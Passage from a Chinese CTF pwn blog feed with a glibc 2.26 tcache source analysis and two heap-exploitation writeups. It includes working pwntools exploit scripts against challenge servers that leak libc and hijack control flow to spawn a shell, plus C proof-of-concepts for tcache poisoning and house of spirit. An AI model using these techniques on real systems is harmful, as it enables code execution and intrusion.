tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else &#123; idx = largebin_index (nb); if (have_fastchunks (av)) malloc_consolidate (av); &#125;... 剩下的步骤，就是如何构造前后堆块使其在malloc_consolidate中可以通过系统的check了。 当这一步完成时，在bss段上的指针数组里，就出现交叉的情况了，通过编辑title内容，就可以对bss段数组上的数据任意写，并且可以写多次。 首先利用got表泄露libc地址，然后再泄露libc中environ变量的地址（栈地址），最后对返回地址写入rop，就可以拿到shell了（其实最简单的方法是对__malloc_hook写one_gadget，但测试过程中，libc的四个one_gadget均不可用…） EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *from ctypes import *debug = 0elf = ELF('./note')#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;if debug: p = remote('127.0.0.1', 1234)#process('./300') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('39.107.14.183', 1234) libc = ELF('./libc-2.23.so') #off = 0x001b0000 context.log_level = 'debug'def change_title(title): p.recvuntil('--&gt;&gt;') p.sendline('1') p.recvuntil('title:') p.send(title)def change_content(size,content): p.recvuntil('--&gt;&gt;') p.sendline('2') p.recvuntil('(64-256):') p.sendline(str(size)) p.recvuntil('content:') p.send(content)def change_comment(content): p.recvuntil('--&gt;&gt;') p.sendline('3') p.recvuntil('comment:') p.sendline(content)def show_content(): p.recvuntil('--&gt;&gt;') p.sendline('4')p.recvuntil('welcome to the note ')offset = int(p.recv(4),10)print '[*]', str(offset + 0x10),hex(offset +0x10)change_content(0x78,p64(0x41)*(8)+p64(0x80)*7+'\n')change_title(p64(0x11)+p64(0x81)+p64(0x602070-0x18)+p64(0x602070-0x10)+p64(0x20)+'@')change_content(150,'a'*110+'\n')change_title(p64(offset+0x10-0x20)+p64(0x81)+p64(0x602070-0x18)+p64(0x602070-0x10)+p64(0x20)+'a')change_content(0x21000,'a'*110+'\n')change_title(p64(0x602058)+p64(elf.got['puts'])+p64(0x78)+p64(0x602058)+'\n')show_content()p.recvuntil('is:')libc.address = u64(p.recv(6).ljust(8,'\0')) - libc.symbols['puts']print '[+] system: ',hex(libc.symbols['system'])change_comment(p64(0x602058)+p64(libc.symbols['environ'])+p64(0x78)+p64(0x602058)+'\n')show_content()p.recvuntil('is:')stack_addr = u64(p.recv(6).ljust(8,'\0'))print '[+] stack: ',hex(stack_addr)offset = 0x7fffffffe4b8- 0x7fffffffe338 change_comment(p64(stack_addr - offset )+p64(libc.symbols['environ'])+p64(0x78)+p64(0x602058)+'\n')change_comment(p64(0x0000000000401673)+p64(next(libc.search('/bin/sh')))+p64(libc.symbols['system']))p.interactive()'''Gadgets information============================================================0x000000000040166c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040166e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401670 : pop r14 ; pop r15 ; ret0x0000000000401672 : pop r15 ; ret0x000000000040166b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040166f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400e00 : pop rbp ; ret0x0000000000401673 : pop rdi ; ret0x0000000000401671 : pop rsi ; pop r15 ; ret0x000000000040166d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c71 : ret0x00000000004002c1 : ret 0x2000x0000000000401300 : ret 0x89480x00000000004012f6 : ret 0x8b480x0000000000400fe5 : ret 0xb60fUnique gadgets found: 15''']]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tcache 源码分析及利用思路]]></title>
    <url>%2F2018%2F03%2F20%2Ftcache%2F</url>
    <content type="text"><![CDATA[tcache，全称是thread local caching，是libc 2.26版本中新增加的内存管理机制，属于一种缓存机制，处理逻辑位于malloc函数和free函数中，优先级较高，第一次见到这个结构是在34C3 CTF中的SimpleGC一题。 总体简介tcache是一个用于加速malloc分配的缓存结构，有由64个链表组成。其优先级很高，会先于全部的bin来处理。每个链表的个数是一定的，当缓存链表装满时，分配方式就与之前版本的malloc相同。但使用了tcache版本的malloc与free函数时，对于堆块的安全性检查就相比于之前的版本弱化很多。 本文依据的代码是libc 2.26，最新出的libc 2.27似乎与2.26相差不多，多了一个SINGLE_THREAD_P变量，用于细化单线程与多线程的处理逻辑，对此研究不深。 数据结构tcache增加了两个全新的结构体，tcache_entry、tcache_perthread_struct。并且在libc内部定义了两个线程局部变量，该局部变量使得在每一个线程内部维护一个tcache结构，当在某线程内部释放内存时，无论内存块属于哪个分配区，都会挂到释放该内存块线程的tcache中。 tcache_entry结构体，看上去并不明白是做什么用的，但在分析代码中发现，这就是一个单链表结构指针。 tcache_pthread_struct结构体，是一个线程tcache的主体，由两个数组组成。其中，entries数据代表tcache的各个链表，共TCACHE_MAX_BINS个（默认为64），counts数组代表每一个单链表内有多少个内存块。 这个tcache结构的组装与fastbin非常相似 1234567891011121314typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct;static __thread char tcache_shutting_down = 0;static __thread tcache_perthread_struct *tcache = NULL; 常量定义：从常量中可以看出，默认配置情况下，结构体最多的单链表个数是64个，每个单链表中最多有7个内存块，可容纳的最大内存块大小是1032。 1234567891011121314151617181920# define TCACHE_MAX_BINS 64# define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables. */# define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* When "x" is from chunksize(). */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)/* When "x" is a user-provided size. */# define usize2tidx(x) csize2tidx (request2size (x))/* With rounding and alignment, the bins are... idx 0 bytes 0..24 (64-bit) or 0..12 (32-bit) idx 1 bytes 25..40 or 13..20 idx 2 bytes 41..56 or 21..28 etc. *//* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */# define TCACHE_FILL_COUNT 7 生成与调试这部分应该写在下一部分，不过在我刚开始动手调试时就遇到了问题，就是 __thread 变量的问题，这个变量是线程内访问的，所以当我在gdb中使用 p tcache 命令输出结构体时出现了错误： 12Cannot find thread-local storage for process 27690, shared library /lib/x86_64-linux-gnu/libc.so.6:Cannot find thread-local variables on this target 就很懵，调试时不能查看结构体数值不就很蛋疼么。。。然后在博客内请教了大佬，还没回我，我就继续分析代码，找到了解决问题的方法（如果有人知道如何直接查看，麻烦告知我） 在代码中发现了一个初始化函数 tcache_init() 12345678910111213141516171819202122232425262728293031323334static voidtcache_init(void)&#123; mstate ar_ptr; void *victim = 0; const size_t bytes = sizeof (tcache_perthread_struct); if (tcache_shutting_down) return; arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); if (!victim &amp;&amp; ar_ptr != NULL) &#123; ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) __libc_lock_unlock (ar_ptr-&gt;mutex); /* In a low memory situation, we may not be able to allocate memory - in which case, we just keep trying later. However, we typically do this very early, so either there is sufficient memory, or there isn't enough memory to do non-trivial allocations anyway. */ if (victim) &#123; tcache = (tcache_perthread_struct *) victim; memset (tcache, 0, sizeof (tcache_perthread_struct)); &#125;&#125; 发现tcache是一个指针，而内存块居然是用_int_malloc生成的，这就是说我们可以不管这个线程局部变量，直接去找这块内存就好了。 继续跟踪函数调用，过程是 1234malloc __libc_malloc MAYBE_INIT_TCACHE tcache_init 而MAYBE_INIT_TCACHE的位置在arena_get之前，并且tcache_init中还包含arena_get函数。结合上一篇对于内存堆分配区的知识，这就可以判断，在对线程的分配区初始化之后，第一个分配的内存就是tcache内存块。 在主分配区该结构是heap段第一块内存，在非主分配应该在sub_heap和thread_state结构体以后 因此首先用vmmap 找到heap地址之后，就可以查看该结构体内容了，进而可以继续调试 1234567891011121314151617181920212223242526pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x555555554000 0x555555555000 r-xp 1000 0 /home/p4nda/Desktop/1 0x555555754000 0x555555755000 r--p 1000 0 /home/p4nda/Desktop/1 0x555555755000 0x555555756000 rw-p 1000 1000 /home/p4nda/Desktop/1 0x555555756000 0x555555777000 rw-p 21000 0 [heap] 0x7ffff79f5000 0x7ffff7bcb000 r-xp 1d6000 0 /lib/x86_64-linux-gnu/libc-2.26.so 0x7ffff7bcb000 0x7ffff7dcb000 ---p 200000 1d6000 /lib/x86_64-linux-gnu/libc-2.26.so 0x7ffff7dcb000 0x7ffff7dcf000 r--p 4000 1d6000 /lib/x86_64-linux-gnu/libc-2.26.so 0x7ffff7dcf000 0x7ffff7dd1000 rw-p 2000 1da000 /lib/x86_64-linux-gnu/libc-2.26.so 0x7ffff7dd1000 0x7ffff7dd5000 rw-p 4000 0 0x7ffff7dd5000 0x7ffff7dfc000 r-xp 27000 0 /lib/x86_64-linux-gnu/ld-2.26.so 0x7ffff7fe0000 0x7ffff7fe2000 rw-p 2000 0 0x7ffff7ff7000 0x7ffff7ffa000 r--p 3000 0 [vvar] 0x7ffff7ffa000 0x7ffff7ffc000 r-xp 2000 0 [vdso] 0x7ffff7ffc000 0x7ffff7ffd000 r--p 1000 27000 /lib/x86_64-linux-gnu/ld-2.26.so 0x7ffff7ffd000 0x7ffff7ffe000 rw-p 1000 28000 /lib/x86_64-linux-gnu/ld-2.26.so 0x7ffff7ffe000 0x7ffff7fff000 rw-p 1000 0 0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [stack]0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall]pwndbg&gt; p *(struct tcache_perthread_struct *)0x555555756000$1 = &#123; counts = &quot;\000\000\000\000\000\000\000\000Q\002&quot;, &apos;\000&apos; &lt;repeats 53 times&gt;, entries = &#123;0x0 &lt;repeats 64 times&gt;&#125;&#125;pwndbg&gt; 堆分配差异当加入了tcache机制后，原来的ptmalloc的堆块释放与分配机制存在一定的改变，先看两个函数tcache_get、tcache_put，可以看出这两个函数与fastbin的取出和插入基本完全一样。 12345678910111213141516171819202122static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125;/* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */static __always_inline void *tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); return (void *) e;&#125; 内存块放入tcache内存释放可以看到，在free函数的最先处理部分，首先是检查释放块是否页对齐及前后堆块的释放情况，便优先放入tcache结构中。 12345678910111213141516171819202122232425262728293031323334353637383940414243_int_free (mstate av, mchunkptr p, int have_lock)&#123; INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ size = chunksize (p); /* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by "design" from some intruder. */ if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) malloc_printerr ("free(): invalid pointer"); /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) malloc_printerr ("free(): invalid size"); check_inuse_chunk(av, p);#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (p, tc_idx); return; &#125; &#125;#endif......&#125; 内存申请在内存分配的malloc函数中有多处，会将内存块移入tcache中。 首先，申请的内存块符合fastbin大小时并且找到在fastbin内找到可用的空闲块时，会把该fastbin链上的其他内存块放入tcache中。 其次，申请的内存块符合smallbin大小时并且找到在smallbin内找到可用的空闲块时，会把该smallbin链上的其他内存块放入tcache中。 还有，当在unsorted bin链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到tcache中，继续处理。 （高能预警：代码经过剪切，仍然很长… ） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171static void *_int_malloc (mstate av, size_t bytes)&#123;... 变量定义 ...#if USE_TCACHE size_t tcache_unsorted_count; /* count of unsorted chunks processed */#endif... ======= 1. 申请块符合fastbin块大小 ======== if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; idx = fastbin_index (nb); mfastbinptr *fb = &amp;fastbin (av, idx); mchunkptr pp; victim = *fb; if (victim != NULL) &#123; if (SINGLE_THREAD_P) *fb = victim-&gt;fd; else REMOVE_FB (fb, pp, victim); if (__glibc_likely (victim != NULL)) &#123; size_t victim_idx = fastbin_index (chunksize (victim)); if (__builtin_expect (victim_idx != idx, 0)) malloc_printerr ("malloc(): memory corruption (fast)"); check_remalloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (SINGLE_THREAD_P) *fb = tc_victim-&gt;fd; else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; &#125;======= 2. 申请块符合smallbin块大小 ======== if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) malloc_printerr ("malloc(): smallbin double linked list corrupted"); set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125;...#if USE_TCACHE INTERNAL_SIZE_T tcache_nb = 0; size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) tcache_nb = nb; int return_cached = 0; tcache_unsorted_count = 0;#endif====== 循环处理unsorted bin内存块 ======== for (;; ) &#123; int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123;...... if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123;...... &#125; /* remove from unsorted list */ unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); /* Take now instead of binning if exact fit */ if (size == nb) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim);#if USE_TCACHE /* Fill cache first, return to user only if cache fills. We may return one of these chunks later. */ if (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (victim, tc_idx); return_cached = 1; continue; &#125; else &#123;#endif check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;#if USE_TCACHE &#125;#endif &#125;...&#125; 内存块从tcache中取出直接分配在内存申请的开始部分，首先会判断申请大小块，在tcache是否存在，如果存在就直接从tcache中摘取，否则再使用_int_malloc分配。 1234567891011121314151617181920212223242526272829303132void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0));#if USE_TCACHE /* int_free also calls request2size, be careful to not pad twice. */ size_t tbytes = request2size (bytes); size_t tc_idx = csize2tidx (tbytes); MAYBE_INIT_TCACHE (); DIAG_PUSH_NEEDS_COMMENT; if (tc_idx &lt; mp_.tcache_bins /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */ &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) &#123; return tcache_get (tc_idx); &#125; DIAG_POP_NEEDS_COMMENT;#endif arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); ....&#125; 最大值限制在循环处理unsorted bin内存块是，如果达到放入unsorted bin块最大数量时，会立即返回。默认是0，即不存在上限。 1234567891011#if USE_TCACHE /* If we've processed as many chunks as we're allowed while filling the cache, return one of the cached ones. */ ++tcache_unsorted_count; if (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; 0 &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit) &#123; return tcache_get (tc_idx); &#125;#endif unsorted bin处理结束在循环处理unsorted bin内存块后，如果之前曾放入过tcache块，则会取出一个并返回。 1234567#if USE_TCACHE /* If all the small chunks we found ended up cached, return one now. */ if (return_cached) &#123; return tcache_get (tc_idx); &#125;#endif ​ 利用方式house_of_spirit当tcache存在时，释放堆块没有对堆块的前后堆块进行合法性校验，只需要构造本块对齐就可以成功将任意构造的堆块释放到tcache中，而在申请时，tcache对内部大小合适的堆块也是直接分配的，并且对于在tcache内任意大小的堆块管理方式是一样的，导致常见的house_of_spirit可以延伸到smallbin。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 #include &lt;stddef.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; #include &lt;string.h&gt;typedef size_t INTERNAL_SIZE_T;struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;;typedef struct malloc_chunk* mchunkptr;int main(int argc, const char* argv[]) &#123; size_t fake_chunk_and_more[64]; void (* c)(char *) ; fake_chunk_and_more[5] = (size_t )puts; //If a funtion ptr stored here... printf("This example showcases how the House of Spirit became more powerful " \ " after the tcache patch\n"); printf("Filling space at and after the fake chunk with invalid data\n"); memset(fake_chunk_and_more, 'A', sizeof(fake_chunk_and_more)); printf("Building fake chunk on the stack at %p\n", (void *)fake_chunk_and_more); mchunkptr fake_chunk = (mchunkptr)(void *)fake_chunk_and_more; fake_chunk-&gt;size = 0x90; void *mem = (void*)((char*)fake_chunk + offsetof(struct malloc_chunk, fd)); free(mem); printf("Passed chunk to free, let's make an allocation for the fake size\n"); size_t *mem2 = malloc(0x80); mem2[3] = (size_t )system; printf("malloc(0x80) returned: %p\n", mem2); c = fake_chunk_and_more[5]; (*c)("/bin/sh"); return 0;&#125; tcache链表劫持可以发现，tcache链表的插入和摘除方式与fastbin是基本一致的，也同样可以对tcache的链表进行劫持，并且，由于分配内存时对size没有任何校验。因此，比fastbin dup更容易利用。 1234567891011121314151617181920212223242526272829303132#include &lt;malloc.h&gt;#include &lt;stddef.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;size_t *chunksizep(void *mem) &#123; return (size_t *)(((char *)mem) - sizeof(size_t));&#125;int main(int argc, const char* argv[]) &#123; void (* c[6])(char *) ; printf("If there is a function ptr array here: %p\n",c); c[3] = puts; void *mem = malloc(0x80); printf("malloc a chunk here , %p. then free it\n ",mem); tcache_entry *victim = (tcache_entry *)mem; free(mem); victim-&gt;next = (void *)c; size_t *mem1 = malloc(0x80); size_t *mem2 = malloc(0x80); printf("malloc twice,get addr 1: %p,2: %p\n",mem1,mem2); mem2[3] = (size_t )system; (*c[3])("/bin/sh"); return 0;&#125; 堆溢出不完全应用于堆溢出，当内存块释放前，size位置被修改为任意包含在tcache范围内时，在释放后都可以被放置在tcache相应位置。 12345678910111213141516171819202122232425262728293031323334 #include &lt;malloc.h&gt; #include &lt;stddef.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt;typedef struct tcache_entry &#123; struct tcache_entry *next; &#125; tcache_entry; size_t *chunksizep(void *mem) &#123; return (size_t *)(((char *)mem) - sizeof(size_t)); &#125; int main(int argc, const char* argv[]) &#123; size_t *a = malloc(0x48); size_t *b = malloc(0x48); size_t *c = malloc(0x48); printf("first , we malloc 3 chunks,1: %p,2: %p,3: %p\n",a,b,c); void (* ptr)(char *) ; *c = puts; printf("overflow....\n"); memset(a, 'a', 0x48+1); printf("free middle of the three\n "); free(b); size_t * d = malloc(0x58); printf("then malloc a bigger chunk:%p\n ",d); d[0x58/sizeof(size_t)-1] = system; printf("%p,%p",c,&amp;d[0x58/sizeof(size_t)-1]); ptr = *c; (*ptr)("/bin/sh"); return 0; &#125; unlink此外，对于small bin大小的堆块，在smallbin中包含有空闲块的时候，会同时将同大小的其他空闲块，放入tcache中，此时也会出现解链操作，但相比于unlink宏，缺少了链完整性校验。因此，原本unlink操作在该条件下也可以使用。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif#define unlink(AV, P, BK, FD) &#123; \ if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \ malloc_printerr (check_action, "corrupted size vs. prev_size", P, AV); \ FD = P-&gt;fd; \ BK = P-&gt;bk; \ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \ malloc_printerr (check_action, "corrupted double-linked list", P, AV); \ else &#123; \ FD-&gt;bk = BK; \ BK-&gt;fd = FD; \ if (!in_smallbin_range (chunksize_nomask (P)) \ &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \ if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \ || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \ malloc_printerr (check_action, \ "corrupted double-linked list (not small)", \ P, AV); \ if (FD-&gt;fd_nextsize == NULL) &#123; \ if (P-&gt;fd_nextsize == P) \ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \ else &#123; \ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \ &#125; \ &#125; else &#123; \ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \ &#125; \ &#125; \ &#125; \&#125; 首先，在tcache满的时候释放几个堆块到small bin中，再将原本的堆块malloc回去，使得tcache为空。再次malloc时，会从smallbin中分配，此时会把刚释放的同等大小堆块移入tcache中，此时会出现unlink。 Referencehttp://tukan.farm/2017/07/08/tcache/ http://ftp.gnu.org/gnu/glibc/ 34C3 CTF —— SimpleGC]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[N1CTF 2018 && 线程堆知识源代码分析]]></title>
    <url>%2F2018%2F03%2F15%2Fn1ctf2018%2F</url>
    <content type="text"><![CDATA[Nu1L队组织的一场国际赛，涉及的知识面很广，仅记录PWN题的第一道和第二道。 vote一道比较常规套路的fastbin利用方法，主要涉及的知识是fastbin堆块的劫持。 题目分析题目是一个投票系统，主要包括5个函数： 涉及的数据结构是投票者的票数和名字： 12340 8 16 ...+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| number | time | name ......... | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 这里的投票函数实现的很诡异，创建了一个新的线程，线程利用一个bss段上的变量传递线程参数，sleep 等待3s开始投票，出现一个问题，当在3s内有另外的投票时，会造成竞争条件，使第一人的票数投到第二人上。 说到诡异，这个取消函数就更诡异了，显然里面有一个UAF以及double free漏洞： 漏洞利用地址泄露利用UAF漏洞，首先申请一个超过global_max_fast的漏洞，这样在释放时，堆块会放到unsorted bin中，在unsorted bin的组织结构中，堆块的fd、bk指针会填充为main_arena+88这个地址，因而泄露了libc的地址。注意防止释放时被top块合并就好了。 Fastbin劫持同样还是利用UAF漏洞，fastbin是一个单链表结构，当可以控制一个堆块的fd指针的时候基本就可以实现任意地址分配。 首先，分配两个大小为0x70 的堆块，并且顺序释放，这样在fastbin中会形成单链表结构，单链表的第二块指向第一块的堆头。 这里的一个比较新的点是，这题的数据结构无法直接修改fd指针，但是由于UAF漏洞，当对一个已释放用户投票时，仍然修改了堆块的fd指针，理论上可以指向任意位置。 这里我选择将fd指针指向原位置+0x20的地址，因为这个地方可以编辑（上一个用户的name字段），因而伪造一个堆块，就可以再将fastbin劫持到其他地方，选择将堆块劫持到 __malloc_hook - 0x23的位置，这个位置是非页对齐的，但是在分配地址时并不检测，而且在libc 2.23库中，此处存在多个libc地址，当非页对齐看时，此处就有一个0x7f，恰好可绕过fastbin的size检测，另外还有一个malloc_assert检测，非常恰巧的一个值。 当可以控制__malloc_hook，将其覆盖为one_gadget，就可以直接通过malloc新的堆块来得到shell了。 解题脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283from pwn import *import time,base64debug=0elf = ELF('./vote')if debug: p= process('./vote') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') #gdb.attach(p)#,'b*0x0400F6D'else: p = remote('47.90.103.10',6000)#process('./pwn1') libc = ELF('./libc-2.23.so')def add(size,name): p.recvuntil('Action:') p.sendline('0') p.recvuntil('size') p.sendline(str(size)) p.recvuntil('name:') p.sendline(name)def show(index): p.recvuntil('Action:') p.sendline('1') p.recvuntil('index') p.sendline(str(index))def vote(index): p.recvuntil('Action:') p.sendline('2') p.recvuntil('index') p.sendline(str(index)) def cancel(index): p.recvuntil('Action:') p.sendline('4') p.recvuntil('index') p.sendline(str(index)) add(0x3e0,'p4nda') #0add(555,'p4nda') #1cancel(0)show(0)p.recvuntil('count: ')leak = int(p.recvline()[:-1])libc.address = leak - 88 - 0x10 - libc.symbols['__malloc_hook']print '[+] ', hex(leak)print '[+] system :',hex(libc.symbols['system'])add(0x50,p64(0x71)+p64(0x71)+p64(libc.symbols['__malloc_hook']-0x23) )#2add(0x50,'p4nda' )#3#add(555,'p4nda') #4cancel(2)cancel(3)for i in range(32): vote(3)add(0x50,'p4nda' )#5add(0x50,'p4nda' )#6add(0x50,'p4n'+p64(libc.address + 0xf0274))#0xf02a4))#6p.recvuntil('Action:')p.sendline('0')p.recvuntil('size')p.sendline(str(0x50))p.interactive()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf0274 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1117 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' 